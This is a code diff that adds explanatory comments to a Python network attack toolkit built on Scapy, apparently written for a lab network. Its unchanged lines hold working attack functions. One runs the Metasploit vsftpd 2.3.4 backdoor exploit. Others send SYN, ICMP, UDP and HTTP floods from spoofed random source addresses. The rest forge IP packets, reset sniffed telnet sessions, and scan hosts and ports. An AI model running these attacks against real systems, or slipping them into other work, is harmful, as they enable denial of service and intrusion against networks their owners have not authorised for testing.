@@ -182,14 +182,17 @@ def perform_dos_icmp_on_XP(ip_addr="192.168.200.40"):
 
 # (6) Code to perform ftp attack
 def perform_ftp_attack():
+    # Target IP address
     ip_addr = "192.168.200.55"
 
+    # Printing a message indicating the intention to exploit the vsftpd 2.3.4 backdoor vulnerability
     print("Exploiting the vsftpd 2.3.4 backdoor vulnerability... ")
 
+    # Constructing the Metasploit command to execute the attack
     metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
 
     try:
-        # Execute the Metasploit command using subprocess
+        # Executing the Metasploit command using the subprocess module
         subprocess.run(metasploit_command, shell=True, check=True)
         return "Exploit executed successfully."
     except subprocess.CalledProcessError as e:
@@ -201,7 +204,7 @@ def perform_sweep(packet_dst=None, start=1, end=255, packet_data=""):
     flag = False
 
     if not packet_dst:
-        # Get input from the user
+        # Get input from the user for the destination IP range and packet data
         packet_dst = input("Enter the destination IP range: ")
         packet_data = input("Enter the packet data: ")
         flag = True
@@ -209,14 +212,17 @@ def perform_sweep(packet_dst=None, start=1, end=255, packet_data=""):
     live_hosts = []
     ip_range = [packet_dst + str(i) for i in range(start, end)]
 
+    # Send ICMP packets to the IP range
     for ip in ip_range:
         packet = IP(dst=ip) / ICMP() / packet_data
         reply = sr1(packet, timeout=0.1, verbose=0)
         if reply is not None and ICMP in reply:
             live_hosts.append(ip)
 
+    # Print the live hosts
     print("Live hosts: ", live_hosts)
 
+    # Return the live hosts if the function is called from another function
     if not flag:
         return live_hosts
 
@@ -226,19 +232,19 @@ def perform_sweep(packet_dst=None, start=1, end=255, packet_data=""):
 # (8) Code to perform port scan
 def perform_port_scan_TCP(ip_addr=None, port_range=None):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to scan: ")
 
     if not port_range:
-        # Get input from the user
+        # Get port range from the user
         port_range = input("Enter the port range to scan (e.g. 1-1000): ")
 
-    # split the port range into two numbers
+    # Split the port range into two numbers
     port_range = port_range.split("-")
-    # convert the port numbers to integers
+    # Convert the port numbers to integers
     port_start = int(port_range[0])
     port_end = int(port_range[1])
-    # create a list of ports to scan
+    # Create a list of ports to scan
     ports = range(port_start, port_end + 1)
 
     print(
@@ -251,20 +257,20 @@ def perform_port_scan_TCP(ip_addr=None, port_range=None):
         + ")."
     )
 
-    # create a list of open ports
+    # Create a list of open ports
     open_ports = []
     try:
-        # scan the ports
+        # Scan the ports
         for port in ports:
-            # create a TCP packet
+            # Create a TCP packet
             tcp_packet = IP(dst=ip_addr) / TCP(dport=port, flags="S")
-            # send the packet and wait for a response
+            # Send the packet and wait for a response
             tcp_response = sr1(tcp_packet, timeout=0.5, verbose=0)
-            # if a response was received
+            # If a response was received
             if tcp_response:
-                # if the response is a SYN-ACK
+                # If the response is a SYN-ACK
                 if tcp_response[TCP].flags == "SA":
-                    # add the port to the list of open ports
+                    # Add the port to the list of open ports
                     open_ports.append(port)
             sr(
                 IP(dst=ip_addr) / TCP(dport=tcp_response.sport, flags="R"),
@@ -274,7 +280,7 @@ def perform_port_scan_TCP(ip_addr=None, port_range=None):
     except AttributeError:
         pass
 
-    # print the open ports
+    # Print the open ports
     for port in open_ports:
         print("Port" + str(port) + " is open!")
 
@@ -284,17 +290,18 @@ def perform_port_scan_TCP(ip_addr=None, port_range=None):
 # (9) Code to perform ip spoofing
 def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
     if not src_ip:
-        # Get input from the user
+        # Get source IP address from the user
         src_ip = input("Enter the source IP address: ")
 
     if not dst_ip:
-        # Get input from the user
+        # Get destination IP address from the user
         dst_ip = input("Enter the destination IP address: ")
 
     if not packet_data:
-        # Get input from the user
+        # Get packet data from the user
         packet_data = input("Enter the packet data: ")
 
+    # Construct the IP packet with the specified source and destination IP addresses, and ICMP layer
     packet = IP(src=src_ip, dst=dst_ip) / ICMP() / packet_data
 
     packet_counter = 0
@@ -315,45 +322,52 @@ def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
 # (10) Code to perform TCP ACK FLAG Scan on custom IP
 def perform_TCP_ACK_scan(dst_ip=None, dst_port=None):
     if not dst_ip:
-        # Get input from the user
+        # Get target IP address from the user
         dst_ip = input("Enter the IP address to scan: ")
 
     if not dst_port:
-        # Get input from the user
+        # Get target port from the user
         dst_port = input("Enter the port to scan: ")
 
-    # Perform the TCP ACK scan
+    # Print the scan information
     print("Performing TCP ACK scan on ", dst_ip, " port ", dst_port, " ...")
 
+    # Send TCP ACK packet and capture the response
     response = sr1(
         IP(dst=dst_ip) / TCP(dport=int(dst_port), flags="A"), timeout=1, verbose=False
     )
 
+    # Check the response
     if response is None:
+        # If no response received, it indicates a stateful firewall presence
         return "Stateful firewall present (Filtered)"
     elif response.haslayer(TCP):
         if response.getlayer(TCP).flags == 0x4:  # RST flag
+            # If the TCP response has the RST flag set, it indicates no firewall (unfiltered)
             return "No firewall (Unfiltered)"
     elif response.haslayer(ICMP):
         if int(response.getlayer(ICMP).type) == 3 and int(
             response.getlayer(ICMP).code
         ) in [1, 2, 3, 9, 10, 13]:
+            # If an ICMP response with specific type and code is received, it indicates a stateful firewall presence
             return "Stateful firewall present (Filtered)"
 
 
 # (11) Code to perform UDP SCAN on custom IP
 def perform_udp_scan(dst_ip=None, dst_port=None, dst_timeout=1):
     if not dst_ip:
-        # Get input from the user
+        # Get target IP address from the user
         dst_ip = input("Enter the IP address to scan: ")
 
     if not dst_port:
-        # Get input from the user
+        # Get target port from the user
         dst_port = input("Enter the port to scan: ")
 
+    # Send UDP packet and capture the response
     udp_scan_resp = sr1(IP(dst=dst_ip) / UDP(dport=int(dst_port)), timeout=dst_timeout)
 
     if udp_scan_resp is None:
+        # If no response is received, retry up to three times
         retrans = []
         for count in range(0, 3):
             retrans.append(
@@ -364,18 +378,22 @@ def perform_udp_scan(dst_ip=None, dst_port=None, dst_timeout=1):
             if item is not None:
                 perform_udp_scan(dst_ip, dst_port, dst_timeout)
 
+        # If still no response, return "Open|Filtered"
         return "Open|Filtered"
 
     elif udp_scan_resp.haslayer(UDP):
+        # If UDP response is received, the port is open
         return "Open"
 
     elif udp_scan_resp.haslayer(ICMP):
+        # If ICMP response is received, analyze the ICMP type and code for further classification
         icmp_type = int(udp_scan_resp.getlayer(ICMP).type)
         icmp_code = int(udp_scan_resp.getlayer(ICMP).code)
 
+        # ICMP type 3 and code 3 indicates a closed port
         if icmp_type == 3 and icmp_code == 3:
             return "Closed"
-
+        # ICMP type 3 and code 1, 2, 9, 10, or 13 indicates a filtered port
         elif icmp_type == 3 and icmp_code in [1, 2, 9, 10, 13]:
             return "Filtered"
 
@@ -383,7 +401,7 @@ def perform_udp_scan(dst_ip=None, dst_port=None, dst_timeout=1):
 # (12) Code to perform os discovery
 def perform_os_discovery(ip_addr=None):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to scan: ")
 
     # Send TCP packet with no flags set
@@ -393,6 +411,7 @@ def perform_os_discovery(ip_addr=None):
     os_result = "Unknown OS"
 
     if response:
+        # If a response is received, perform OS fingerprinting
         os_result = os_fingerprint(response)
 
     return "OS discovery performed on {}. Detected OS: {}".format(ip_addr, os_result)
@@ -401,13 +420,14 @@ def perform_os_discovery(ip_addr=None):
 # (12.1) Determine the OS based on the response packet TTL value
 def os_fingerprint(packet):
     if packet.haslayer(IP):
+        # Get the TTL value from the IP layer
         ip_ttl = packet[IP].ttl
 
-        # Assuming Linux-based OSes have a TTL value of 64
+        # Linux-based OS usually have a TTL value of 64
         if ip_ttl == 64:
             return "Linux-based OS"
 
-        # Assuming Windows-based OSes have a TTL value of 128
+        # Windows-based OS usually have a TTL value of 128
         elif ip_ttl == 128:
             return "Windows-based OS"
 
@@ -418,11 +438,13 @@ def os_fingerprint(packet):
 # (13) Code to perform syn flood attack
 def perform_syn_flood_attack(ip_addr=None, port="139"):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to attack: ")
 
+    # Craft the packet with a spoofed source IP address and SYN flag set
     packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port), flags="S")
 
+    # Send the packet repeatedly to flood the target IP with SYN packets
     send(packet, inter=0.00005, loop=1, verbose=0)
 
     return "SYN flood attack performed on " + ip_addr + " to port " + port
@@ -431,11 +453,13 @@ def perform_syn_flood_attack(ip_addr=None, port="139"):
 # (14) Code to perform icmp flood attack
 def perform_icmp_flood_attack(ip_addr=None):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to attack: ")
 
+    # Craft the ICMP packet with a spoofed source IP address and payload
     packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"
 
+    # Send the packet repeatedly to flood the target IP with ICMP packets
     send(packet, inter=0.005, loop=1, verbose=0)
 
     return "ICMP flood attack performed on " + ip_addr
@@ -444,15 +468,17 @@ def perform_icmp_flood_attack(ip_addr=None):
 # (15) Code to perform udp flood attack
 def perform_udp_flood_attack(ip_addr=None, port=None):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to scan: ")
 
     if not port:
-        # Get input from the user
+        # Get target port from the user
         port = input("Enter the port to attack: ")
 
+    # Craft the UDP packet with a spoofed source IP address and payload
     packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())
 
+    # Send the packet repeatedly to flood the target IP with UDP packets
     send(packet, inter=0.005, loop=1, verbose=0)
 
     return "UDP flood attack performed on " + ip_addr + " to port " + port
@@ -461,13 +487,15 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 # (16) Code to perform http flood attack
 def perform_http_flood_attack(ip_addr=None, port=80):
     if not ip_addr:
-        # Get input from the user
+        # Get target IP address from the user
         ip_addr = input("Enter the IP address to attack: ")
 
     # Create a flag to indicate whether to stop the attack
     stop_flag = threading.Event()
 
+    # Define a function to send HTTP requests
     def send_request():
+        # Send HTTP requests until the stop flag is set
         while not stop_flag.is_set():
             http_request(
                 host=ip_addr, path="/", port=80, display=False, verbose=0
@@ -508,11 +536,14 @@ def perform_ping_of_death(ip_addr=None):
 # (17) Code to perform TCP reset attack on telnet
 def perform_tcp_rst_on_telnet():
     print("Telnet Reset")
+    # Get the IP address of the Telnet requester
     host1 = input("Enter the IP address to attack (the one who requested the telnet): ")
+    # Get the IP address of the Telnet target
     host2 = input("Enter the IP address of the target of Telnet: ")
-    interface = "eth0"
-    dstPORT = 23
+    interface = "eth0"  # Network interface to use
+    dstPORT = 23  # Destination port for Telnet (default is 23)
 
+    # Function to send TCP RST/ACK packets
     def do_rst(pkt):
         ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
         tcp = TCP(
@@ -523,9 +554,9 @@ def perform_tcp_rst_on_telnet():
             ack=pkt[TCP].seq + 1,
         )  # 0x14 = 20 --> RST/ACK
         pkt = ip / tcp
-        # ls(pkt)
-        send(pkt, verbose=0)
+        send(pkt, verbose=0)  # Send the forged packet
 
+    # Sniff for Telnet packets and perform TCP RST/ACK attack
     sniff(
         iface=interface,
         filter="host " + host1 + " and host " + host2 + " and port " + str(dstPORT),
